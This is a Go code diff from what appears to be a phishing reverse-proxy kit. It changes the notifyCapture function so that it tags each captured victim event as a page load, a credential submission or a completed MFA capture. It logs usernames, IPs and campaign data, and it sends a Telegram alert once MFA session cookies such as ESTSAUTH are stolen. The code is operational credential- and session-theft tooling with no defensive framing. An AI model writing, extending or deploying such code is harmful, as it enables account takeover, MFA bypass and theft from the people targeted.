@@ -223,25 +223,21 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		password = pl.extractPassword(bodyStr)
 	}
 
-	// Write analytics event
+	// Determine event type based on stage in the attack chain
 	captureTime := time.Now().UTC().Format(time.RFC3339)
 	campaignCookie, _ := r.Cookie("_c")
 	campaignID := ""
 	if campaignCookie != nil {
 		campaignID = campaignCookie.Value
 	}
-	writeEvent(map[string]interface{}{
-		"timestamp":   captureTime,
-		"campaign_id": campaignID,
-		"brand":       pl.Name,
-		"username":    username,
-		"ip":          r.RemoteAddr,
-		"user_agent":  r.UserAgent(),
-		"status":      "success",
-		"source":      "proxy",
-	})
 
-	// Only fire Telegram when MFA session cookies (ESTSAUTH etc) are captured.
+	eventType := "page_load"
+	status := "info"
+	if username != "" {
+		eventType = "credential_submit"
+		status = "success"
+	}
+	// Check for MFA session cookies
 	hasSession := false
 	for _, c := range capturedCookies {
 		name := strings.SplitN(c, "=", 2)[0]
@@ -250,6 +246,24 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 			break
 		}
 	}
+	if hasSession {
+		eventType = "mfa_complete"
+		status = "success"
+	}
+
+	writeEvent(map[string]interface{}{
+		"timestamp":   captureTime,
+		"campaign_id": campaignID,
+		"brand":       pl.Name,
+		"username":    username,
+		"ip":          r.RemoteAddr,
+		"user_agent":  r.UserAgent(),
+		"event_type":  eventType,
+		"status":      status,
+		"source":      "proxy",
+	})
+
+	// Only fire Telegram when MFA session cookies (ESTSAUTH etc) are captured.
 	if !hasSession {
 		return
 	}
